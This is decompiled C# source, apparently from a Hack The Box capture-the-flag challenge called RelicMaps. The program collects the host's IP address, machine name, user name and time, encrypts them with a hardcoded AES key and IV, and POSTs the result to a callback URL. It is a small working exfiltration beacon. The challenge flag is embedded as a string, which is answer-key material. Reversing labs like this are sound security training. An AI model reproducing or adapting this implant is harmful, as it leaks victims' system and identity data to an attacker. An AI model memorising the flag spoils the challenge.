using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;

namespace RelicMaps
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f3: Expected O, but got Unknown
			//IL_012b: Unknown result type (might be due to invalid IL or missing references)
			IPAddress val = Enumerable.FirstOrDefault<IPAddress>((IEnumerable<IPAddress>)Dns.GetHostAddresses(Dns.GetHostName()), (Func<IPAddress, bool>)((IPAddress ip) => (int)ip.get_AddressFamily() == 2));
			string machineName = Environment.MachineName;
			string userName = Environment.UserName;
			DateTime now = DateTime.Now;
			string text = "HTB{0neN0Te?_iT'5_4_tr4P!}";
			string s = $"i={val}&n={machineName}&u={userName}&t={now}&f={text}";
			Aes obj = Aes.Create("AES");
			((SymmetricAlgorithm)obj).set_Mode((CipherMode)1);
			((SymmetricAlgorithm)obj).set_Key(Convert.FromBase64String("B63PbsPUm3dMyO03Cc2lYNT2oUNbzIHBNc5LM5Epp6I="));
			((SymmetricAlgorithm)obj).set_IV(Convert.FromBase64String("dgB58uwgaohVelj4Xhs7RQ=="));
			((SymmetricAlgorithm)obj).set_Padding((PaddingMode)2);
			ICryptoTransform obj2 = ((SymmetricAlgorithm)obj).CreateEncryptor();
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			string text2 = Convert.ToBase64String(obj2.TransformFinalBlock(bytes, 0, bytes.Length));
			Console.WriteLine(text2);
			HttpClient httpClient = new HttpClient();
			HttpRequestMessage httpRequestMessage = new HttpRequestMessage
			{
				RequestUri = new Uri("http://relicmaps.htb/callback"),
				Method = HttpMethod.Post,
				Content = new StringContent(text2, Encoding.UTF8, "application/json")
			};
			Console.WriteLine((object)httpRequestMessage);
			HttpResponseMessage result = httpClient.SendAsync(httpRequestMessage).Result;
			Console.WriteLine((object)result.StatusCode);
			Console.WriteLine(result.Content.ReadAsStringAsync().Result);
		}
	}
}
